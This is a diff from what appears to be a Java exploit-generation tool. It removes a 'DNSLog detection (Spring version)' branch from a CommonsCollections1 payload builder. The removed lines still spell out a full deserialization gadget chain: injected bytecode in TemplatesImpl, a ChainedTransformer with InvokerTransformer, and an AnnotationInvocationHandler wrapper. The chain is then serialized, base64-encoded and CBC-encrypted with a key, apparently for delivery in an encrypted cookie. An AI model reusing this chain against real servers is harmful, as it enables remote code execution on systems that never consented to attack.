@@ -238,47 +238,6 @@ public class CommonsCollections1 {
             String data = Base64.getEncoder().encodeToString(baos.toByteArray());
             return Tools.CBC_Encrypt(key, data);
 
-        } else if (echoType.equals("DNSLogEchoSpring")) {
-            // DNSLog 探测（Spring 版本）
-            DNSLogEchoSpring dnsLogEchoSpring = new DNSLogEchoSpring();
-            ctClass = dnsLogEchoSpring.genPayload(pool);
-
-            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
-                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
-            } else {
-                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
-            }
-            ctClass.setSuperclass(superClass);
-
-            TemplatesImpl templates = new TemplatesImpl();
-            setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
-            setFieldValue(templates, "_name", "a");
-            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
-
-            Transformer[] transformers = new Transformer[]{
-                    new ConstantTransformer(templates),
-                    new InvokerTransformer("newTransformer", new Class[0], new Object[0]),
-                    new ConstantTransformer(1)
-            };
-            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
-
-            HashMap<Object, Object> innerMap = new HashMap<Object, Object>();
-            innerMap.put("value", "value");
-            Map<Object, Object> transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
-
-            Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
-            Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
-            constructor.setAccessible(true);
-            Object object = constructor.newInstance(Target.class, transformedMap);
-
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            ObjectOutputStream oos = new ObjectOutputStream(baos);
-            oos.writeObject(object);
-            oos.close();
-
-            String data = Base64.getEncoder().encodeToString(baos.toByteArray());
-            return Tools.CBC_Encrypt(key, data);
-
         } else {
             throw new Exception("不支持的回显类型: " + echoType);
         }
